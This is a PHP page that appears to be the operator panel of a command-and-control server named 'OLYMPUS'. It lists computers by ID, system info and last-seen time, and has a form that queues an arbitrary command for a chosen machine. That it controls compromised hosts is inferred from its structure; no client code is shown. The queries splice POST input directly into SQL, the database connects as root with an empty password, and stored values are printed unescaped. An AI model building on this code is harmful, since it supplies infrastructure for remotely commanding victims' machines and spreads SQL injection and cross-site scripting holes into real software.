<!DOCTYPE html>
<?php

    // First we execute our common code to connection to the database and start the session
    require("common.php");

    // At the top of the page we check to see whether the user is logged in or not
    if(empty($_SESSION['user']))
    {
        // If they are not, we redirect them to the login page.
        header("Location: login.php");

        // Remember that this die statement is absolutely critical.  Without it,
        // people can view your members-only content without logging in.
        die("Redirecting to login.php");
    }

    if(isset($_POST['CID']) && isset($_POST['COMMAND']))
    {
      $servername = "localhost";
      $username = "root";
      $password = "";
      $dbname = "database";
      $name = $_POST['CID'];
      $command = $_POST['COMMAND'];
      $not_yet = "NOTEXECUTED";

      // Create connection
      $conn = new mysqli($servername, $username, $password, $dbname);
      // Check connection
      if ($conn->connect_error) {
          die("Connection failed: " . $conn->connect_error);
      }

      $query = "SELECT * from data where COMPUTER_ID ='$name'";
       if ($result=mysqli_query($conn,$query))
        {
         if(mysqli_num_rows($result) > 0)
          {
            $sql = "UPDATE data SET LAST_COMMAND='$command', EXECUTED='$not_yet' WHERE COMPUTER_ID='$name'";
            if ($conn->query($sql) === TRUE)
                echo "Record updated successfully";
          }
        }
        $conn->close();
    }

    //Showing all the records inside the database like computer name, operating system, last seen, last_command, error debugging
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "ONI";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "SELECT COMPUTER_ID, SYSTEM_INFO, LAST_COMMAND, EXECUTED, LAST_SEEN FROM data";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        echo "<h2 style='text-align:center;'>OLYMPUS</h2>";
          echo "<table><tr><th>COMPUTER_ID</th><th>SYS INFO</th><th>LAST EVENT</th><th>ERROR CODE</th><th>LAST CONNECTION</th></tr><br>";
        // output data of each row
        while($row = $result->fetch_assoc()) {
            echo "<tr><td>".$row["COMPUTER_ID"]."</td><td>".$row["SYSTEM_INFO"]."</td><td>".$row["LAST_COMMAND"]."</td><td>".$row["EXECUTED"]."</td><td>".$row["LAST_SEEN"]."</td></tr>";
        }
        echo "</table>";
    } else {
        echo "0 results";
    }
    $conn->close();
    // Everything below this point in the file is secured by the login system

    // We can display the user's username to them by reading it from the session array.  Remember that because
    // a username is user submitted content we must use htmlentities on it before displaying it to the user.
?>
  <head>
  <style>
    table {
      font-family: arial, sans-serif;
      border-collapse: collapse;
      width: 100%;
    }

    td, th {
      border: 1px solid #dddddd;
      text-align: left;
      padding: 8px;
    }

    tr:nth-child(even) {
      background-color: #dddddd;
    }
  </style>
  </head>
  <body>
    <br>
    <form action="private.php" method="post">
        Computer ID:<br />
        <input type="text" name="CID"/>
        <br /><br />
        Command:<br />
        <input type="text" name="COMMAND" value="" />
        <br /><br />
        <input type="submit" value="Update" />
    </form>
    <br />
    <a href="logout.php">Logout</a>
  </body>
